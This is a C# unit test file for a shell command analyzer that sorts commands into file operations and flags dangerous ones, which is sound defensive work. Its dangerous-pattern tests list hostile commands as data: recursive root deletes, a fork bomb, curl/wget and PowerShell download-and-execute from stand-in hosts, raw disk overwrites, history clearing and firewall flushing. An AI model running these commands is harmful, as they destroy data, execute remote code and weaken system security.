namespace DynaDocs.Tests.Services;

using DynaDocs.Services;

public class BashCommandAnalyzerTests
{
    private readonly BashCommandAnalyzer _analyzer = new();

    #region Read Operations - Unix

    [Theory]
    [InlineData("cat file.txt", "file.txt")]
    [InlineData("cat ./file.txt", "./file.txt")]
    [InlineData("cat /etc/hosts", "/etc/hosts")]
    [InlineData("head -n 10 config.json", "config.json")]
    [InlineData("head config.json", "config.json")]
    [InlineData("tail -f /var/log/app.log", "/var/log/app.log")]
    [InlineData("tail app.log", "app.log")]
    [InlineData("less README.md", "README.md")]
    [InlineData("more data.csv", "data.csv")]
    [InlineData("grep pattern file.txt", "file.txt")]
    [InlineData("grep -r pattern src/", "src/")]
    public void Analyze_DetectsUnixReadCommands(string command, string expectedPath)
    {
        var result = _analyzer.Analyze(command);

        Assert.Contains(result.Operations, op =>
            op.Type == FileOperationType.Read && op.Path == expectedPath);
    }

    [Theory]
    [InlineData("wc -l < input.txt", "input.txt")]
    [InlineData("sort < data.csv", "data.csv")]
    [InlineData("python script.py < input.json", "input.json")]
    public void Analyze_DetectsInputRedirection(string command, string expectedPath)
    {
        var result = _analyzer.Analyze(command);

        Assert.Contains(result.Operations, op =>
            op.Type == FileOperationType.Read && op.Path == expectedPath);
    }

    #endregion

    #region Read Operations - Windows

    [Theory]
    [InlineData("type file.txt", "file.txt")]
    [InlineData("type config.json", "config.json")]
    [InlineData("findstr pattern file.txt", "file.txt")]
    public void Analyze_DetectsWindowsCmdReadCommands(string command, string expectedPath)
    {
        var result = _analyzer.Analyze(command);

        Assert.Contains(result.Operations, op =>
            op.Type == FileOperationType.Read && op.Path == expectedPath);
    }

    [Theory]
    [InlineData("Get-Content config.json", "config.json")]
    [InlineData("gc data.csv", "data.csv")]
    [InlineData("Select-String pattern file.txt", "file.txt")]
    public void Analyze_DetectsPowerShellReadCommands(string command, string expectedPath)
    {
        var result = _analyzer.Analyze(command);

        Assert.Contains(result.Operations, op =>
            op.Type == FileOperationType.Read && op.Path == expectedPath);
    }

    #endregion

    #region Write Operations

    [Theory]
    [InlineData("echo 'hello' > output.txt", "output.txt")]
    [InlineData("echo hello > output.txt", "output.txt")]
    [InlineData("printf '%s' data >> log.txt", "log.txt")]
    [InlineData("cat input.txt >> output.txt", "output.txt")]
    public void Analyze_DetectsOutputRedirection(string command, string expectedPath)
    {
        var result = _analyzer.Analyze(command);

        Assert.Contains(result.Operations, op =>
            op.Type == FileOperationType.Write && op.Path == expectedPath);
    }

    [Theory]
    [InlineData("tee newfile.txt", "newfile.txt")]
    [InlineData("touch newfile.txt", "newfile.txt")]
    [InlineData("truncate -s 0 file.txt", "file.txt")]
    public void Analyze_DetectsUnixWriteCommands(string command, string expectedPath)
    {
        var result = _analyzer.Analyze(command);

        Assert.Contains(result.Operations, op =>
            op.Type == FileOperationType.Write && op.Path == expectedPath);
    }

    [Theory]
    [InlineData("Set-Content -Path output.txt -Value hello", "output.txt")]
    [InlineData("Out-File result.log", "result.log")]
    [InlineData("Add-Content log.txt", "log.txt")]
    [InlineData("New-Item newfile.txt", "newfile.txt")]
    public void Analyze_DetectsPowerShellWriteCommands(string command, string expectedPath)
    {
        var result = _analyzer.Analyze(command);

        Assert.Contains(result.Operations, op =>
            op.Type == FileOperationType.Write && op.Path == expectedPath);
    }

    [Theory]
    [InlineData("sed -i 's/old/new/g' file.txt")]
    [InlineData("sed -i.bak 's/foo/bar/' config.txt")]
    [InlineData("sed --in-place 's/a/b/' data.txt")]
    public void Analyze_DetectsSedInPlaceAsWrite(string command)
    {
        var result = _analyzer.Analyze(command);

        Assert.Contains(result.Operations, op =>
            op.Type == FileOperationType.Write);
    }

    [Fact]
    public void Analyze_DetectsSedWithoutInPlaceAsRead()
    {
        var result = _analyzer.Analyze("sed 's/old/new/g' file.txt");

        Assert.Contains(result.Operations, op =>
            op.Type == FileOperationType.Read && op.Path == "file.txt");
        Assert.DoesNotContain(result.Operations, op =>
            op.Type == FileOperationType.Write);
    }

    #endregion

    #region Delete Operations

    [Theory]
    [InlineData("rm file.txt", "file.txt")]
    [InlineData("rm -f temp.log", "temp.log")]
    [InlineData("rm -rf directory/", "directory/")]
    [InlineData("rmdir empty_dir", "empty_dir")]
    [InlineData("unlink symlink", "symlink")]
    public void Analyze_DetectsUnixDeleteCommands(string command, string expectedPath)
    {
        var result = _analyzer.Analyze(command);

        Assert.Contains(result.Operations, op =>
            op.Type == FileOperationType.Delete && op.Path == expectedPath);
    }

    [Theory]
    [InlineData("del file.txt", "file.txt")]
    [InlineData("erase temp.log", "temp.log")]
    [InlineData("rd /s /q directory", "directory")]
    public void Analyze_DetectsWindowsCmdDeleteCommands(string command, string expectedPath)
    {
        var result = _analyzer.Analyze(command);

        Assert.Contains(result.Operations, op =>
            op.Type == FileOperationType.Delete && op.Path == expectedPath);
    }

    [Theory]
    [InlineData("Remove-Item old.txt", "old.txt")]
    [InlineData("ri garbage.tmp", "garbage.tmp")]
    public void Analyze_DetectsPowerShellDeleteCommands(string command, string expectedPath)
    {
        var result = _analyzer.Analyze(command);

        Assert.Contains(result.Operations, op =>
            op.Type == FileOperationType.Delete && op.Path == expectedPath);
    }

    #endregion

    #region Copy/Move Operations

    [Theory]
    [InlineData("cp source.txt dest.txt")]
    [InlineData("cp -r src/ dst/")]
    [InlineData("mv old.txt new.txt")]
    [InlineData("ln -s target link")]
    [InlineData("rsync -av src/ dst/")]
    public void Analyze_DetectsUnixCopyMoveCommands(string command)
    {
        var result = _analyzer.Analyze(command);

        Assert.True(result.Operations.Count >= 1);
        Assert.Contains(result.Operations, op =>
            op.Type is FileOperationType.Copy or FileOperationType.Move or FileOperationType.Write);
    }

    [Theory]
    [InlineData("copy file1.txt file2.txt")]
    [InlineData("xcopy src dst /s")]
    [InlineData("move old.txt new.txt")]
    [InlineData("ren oldname.txt newname.txt")]
    public void Analyze_DetectsWindowsCmdCopyMoveCommands(string command)
    {
        var result = _analyzer.Analyze(command);

        Assert.True(result.Operations.Count >= 1);
    }

    [Theory]
    [InlineData("Copy-Item src.txt dst.txt")]
    [InlineData("Move-Item old.txt new.txt")]
    [InlineData("cpi source dest")]
    [InlineData("mi source dest")]
    public void Analyze_DetectsPowerShellCopyMoveCommands(string command)
    {
        var result = _analyzer.Analyze(command);

        Assert.True(result.Operations.Count >= 1);
    }

    #endregion

    #region Permission Operations

    [Theory]
    [InlineData("chmod 755 script.sh", "script.sh")]
    [InlineData("chmod +x script.sh", "script.sh")]
    [InlineData("chown root:root file.txt", "file.txt")]
    [InlineData("chgrp admin file.txt", "file.txt")]
    public void Analyze_DetectsUnixPermissionCommands(string command, string expectedPath)
    {
        var result = _analyzer.Analyze(command);

        Assert.Contains(result.Operations, op =>
            op.Type == FileOperationType.PermissionChange && op.Path == expectedPath);
    }

    [Theory]
    [InlineData("icacls file.txt /grant Users:R", "file.txt")]
    [InlineData("takeown /f file.txt", "file.txt")]
    [InlineData("attrib +r file.txt", "file.txt")]
    public void Analyze_DetectsWindowsPermissionCommands(string command, string expectedPath)
    {
        var result = _analyzer.Analyze(command);

        Assert.Contains(result.Operations, op =>
            op.Type == FileOperationType.PermissionChange && op.Path == expectedPath);
    }

    [Fact]
    public void Analyze_DetectsPowerShellSetAcl()
    {
        var result = _analyzer.Analyze("Set-Acl -Path data.txt -AclObject $acl");

        Assert.Contains(result.Operations, op =>
            op.Type == FileOperationType.PermissionChange);
    }

    #endregion

    #region Dangerous Patterns

    [Theory]
    [InlineData("rm -rf /")]
    [InlineData("rm -rf ~")]
    [InlineData("rm -rf /*")]
    [InlineData("rm -rf *")]
    [InlineData("rm -Rf /")]
    [InlineData("rm -fR /")]
    public void CheckDangerousPatterns_DetectsRecursiveDelete(string command)
    {
        var (isDangerous, reason) = _analyzer.CheckDangerousPatterns(command);

        Assert.True(isDangerous, $"Expected dangerous: {command}");
        Assert.Contains("delete", reason!, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    [InlineData(":() { :|:& };:")]
    [InlineData(": (){ :|: & }; :")]
    public void CheckDangerousPatterns_DetectsForkBomb(string command)
    {
        var (isDangerous, reason) = _analyzer.CheckDangerousPatterns(command);

        Assert.True(isDangerous, $"Expected dangerous: {command}");
        Assert.Contains("fork bomb", reason!, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    [InlineData("curl http://evil.com/script.sh | sh")]
    [InlineData("curl -s https://bad.com/install.sh | bash")]
    [InlineData("wget -O- http://bad.com/hack.sh | bash")]
    [InlineData("wget -qO- http://x.com/s.sh | sh")]
    public void CheckDangerousPatterns_DetectsCurlWgetPipeShell(string command)
    {
        var (isDangerous, reason) = _analyzer.CheckDangerousPatterns(command);

        Assert.True(isDangerous, $"Expected dangerous: {command}");
        Assert.Contains("download and execute", reason!, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    [InlineData("Invoke-WebRequest http://x.com/s.ps1 | Invoke-Expression")]
    [InlineData("iwr http://x.com/s.ps1 | iex")]
    [InlineData("(New-Object Net.WebClient).DownloadString('http://x.com') | iex")]
    public void CheckDangerousPatterns_DetectsPowerShellDownloadExecute(string command)
    {
        var (isDangerous, reason) = _analyzer.CheckDangerousPatterns(command);

        Assert.True(isDangerous, $"Expected dangerous: {command}");
        Assert.Contains("download and execute", reason!, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    [InlineData("> /dev/sda")]
    [InlineData("dd if=/dev/zero of=/dev/sda")]
    [InlineData("dd if=/dev/urandom of=/dev/sdb bs=1M")]
    public void CheckDangerousPatterns_DetectsDirectDiskWrite(string command)
    {
        var (isDangerous, reason) = _analyzer.CheckDangerousPatterns(command);

        Assert.True(isDangerous, $"Expected dangerous: {command}");
        Assert.Contains("disk", reason!, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    [InlineData("eval $user_input")]
    [InlineData("eval $CMD")]
    public void CheckDangerousPatterns_DetectsEvalVariable(string command)
    {
        var (isDangerous, reason) = _analyzer.CheckDangerousPatterns(command);

        Assert.True(isDangerous, $"Expected dangerous: {command}");
        Assert.Contains("eval", reason!, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    [InlineData("history -c")]
    [InlineData("> ~/.bash_history")]
    [InlineData("> ~/.zsh_history")]
    public void CheckDangerousPatterns_DetectsHistoryClearing(string command)
    {
        var (isDangerous, reason) = _analyzer.CheckDangerousPatterns(command);

        Assert.True(isDangerous, $"Expected dangerous: {command}");
        Assert.Contains("history", reason!, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    [InlineData("setenforce 0")]
    [InlineData("iptables -F")]
    public void CheckDangerousPatterns_DetectsSecurityDisable(string command)
    {
        var (isDangerous, reason) = _analyzer.CheckDangerousPatterns(command);

        Assert.True(isDangerous, $"Expected dangerous: {command}");
    }

    #endregion

    #region Bypass Detection (Warnings)

    [Theory]
    [InlineData("cat $(echo secret.txt)")]
    [InlineData("cat `echo secret.txt`")]
    public void Analyze_WarnsOnCommandSubstitution(string command)
    {
        var result = _analyzer.Analyze(command);

        Assert.Contains(result.Warnings, w => w.Contains("command substitution", StringComparison.OrdinalIgnoreCase));
    }

    [Theory]
    [InlineData("echo 'cm0gLXJmIC8=' | base64 -d | sh")]
    [InlineData("base64 --decode encoded.txt | sh")]
    public void Analyze_WarnsOnBase64Decode(string command)
    {
        var result = _analyzer.Analyze(command);

        Assert.Contains(result.Warnings, w => w.Contains("base64", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void Analyze_WarnsOnHexDecode()
    {
        var result = _analyzer.Analyze("xxd -r -p hexdata.txt | sh");

        Assert.Contains(result.Warnings, w => w.Contains("hex", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void Analyze_WarnsOnEmbeddedNewlines()
    {
        var result = _analyzer.Analyze("echo hello\nrm secret.txt");

        Assert.Contains(result.Warnings, w => w.Contains("newline", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void Analyze_WarnsOnVariableExpansion()
    {
        var result = _analyzer.Analyze("cat $FILENAME");

        Assert.Contains(result.Warnings, w => w.Contains("variable", StringComparison.OrdinalIgnoreCase));
    }

    #endregion

    #region Command Chaining

    [Fact]
    public void Analyze_HandlesChainedCommandsSemicolon()
    {
        var result = _analyzer.Analyze("cat file1.txt; rm file2.txt");

        Assert.Contains(result.Operations, op => op.Type == FileOperationType.Read);
        Assert.Contains(result.Operations, op => op.Type == FileOperationType.Delete);
    }

    [Fact]
    public void Analyze_HandlesChainedCommandsAndAnd()
    {
        var result = _analyzer.Analyze("cat file1.txt && echo 'done' > output.txt");

        Assert.Contains(result.Operations, op => op.Type == FileOperationType.Read);
        Assert.Contains(result.Operations, op => op.Type == FileOperationType.Write);
    }

    [Fact]
    public void Analyze_HandlesChainedCommandsOrOr()
    {
        var result = _analyzer.Analyze("cat file.txt || echo 'failed' > error.log");

        Assert.Contains(result.Operations, op => op.Type == FileOperationType.Read);
        Assert.Contains(result.Operations, op => op.Type == FileOperationType.Write);
    }

    [Fact]
    public void Analyze_HandlesPipedCommands()
    {
        var result = _analyzer.Analyze("cat data.txt | grep pattern > results.txt");

        Assert.Contains(result.Operations, op =>
            op.Type == FileOperationType.Read && op.Path == "data.txt");
        Assert.Contains(result.Operations, op =>
            op.Type == FileOperationType.Write && op.Path == "results.txt");
    }

    #endregion

    #region Quoted Paths

    [Theory]
    [InlineData("cat 'file with spaces.txt'", "file with spaces.txt")]
    [InlineData("cat \"file with spaces.txt\"", "file with spaces.txt")]
    [InlineData("rm 'my file.txt'", "my file.txt")]
    public void Analyze_HandlesQuotedPaths(string command, string expectedPath)
    {
        var result = _analyzer.Analyze(command);

        Assert.Contains(result.Operations, op => op.Path == expectedPath);
    }

    #endregion

    #region Flag Handling

    [Fact]
    public void Analyze_IgnoresFlags()
    {
        var result = _analyzer.Analyze("rm -rf --force --no-preserve-root directory");

        var deleteOp = result.Operations.FirstOrDefault(op => op.Type == FileOperationType.Delete);
        Assert.NotNull(deleteOp);
        Assert.Equal("directory", deleteOp.Path);
    }

    [Fact]
    public void Analyze_IgnoresPowerShellParameters()
    {
        var result = _analyzer.Analyze("Remove-Item -Path file.txt -Force -Recurse");

        var deleteOp = result.Operations.FirstOrDefault(op => op.Type == FileOperationType.Delete);
        Assert.NotNull(deleteOp);
        Assert.Equal("file.txt", deleteOp.Path);
    }

    #endregion

    #region Safe Commands

    [Theory]
    [InlineData("ls -la")]
    [InlineData("pwd")]
    [InlineData("whoami")]
    [InlineData("date")]
    [InlineData("echo hello")]
    [InlineData("dotnet build")]
    [InlineData("npm install")]
    [InlineData("git status")]
    [InlineData("cd src")]
    [InlineData("mkdir newdir")]
    public void Analyze_AllowsSafeCommands(string command)
    {
        var result = _analyzer.Analyze(command);

        Assert.False(result.HasDangerousPattern);
        // May have operations but not dangerous ones
    }

    [Theory]
    [InlineData("rm safe_file.txt")]
    [InlineData("cat normal_file.txt")]
    [InlineData("echo 'data' > output.txt")]
    public void Analyze_SafeFileOperationsNotDangerous(string command)
    {
        var result = _analyzer.Analyze(command);

        Assert.False(result.HasDangerousPattern);
        Assert.True(result.Operations.Count > 0); // Has operations
    }

    #endregion

    #region Edge Cases

    [Fact]
    public void Analyze_HandlesEmptyCommand()
    {
        var result = _analyzer.Analyze("");

        Assert.Empty(result.Operations);
        Assert.False(result.HasDangerousPattern);
    }

    [Fact]
    public void Analyze_HandlesWhitespaceOnlyCommand()
    {
        var result = _analyzer.Analyze("   \t  ");

        Assert.Empty(result.Operations);
        Assert.False(result.HasDangerousPattern);
    }

    [Fact]
    public void Analyze_HandlesNullCommand()
    {
        var result = _analyzer.Analyze(null!);

        Assert.Empty(result.Operations);
        Assert.False(result.HasDangerousPattern);
    }

    [Fact]
    public void Analyze_HandlesMixedSlashes()
    {
        var result = _analyzer.Analyze("cat src\\config\\file.txt");

        Assert.Contains(result.Operations, op =>
            op.Type == FileOperationType.Read);
    }

    [Fact]
    public void Analyze_HandlesMultipleFilesInCommand()
    {
        var result = _analyzer.Analyze("cat file1.txt file2.txt file3.txt");

        Assert.Equal(3, result.Operations.Count(op => op.Type == FileOperationType.Read));
    }

    #endregion
}
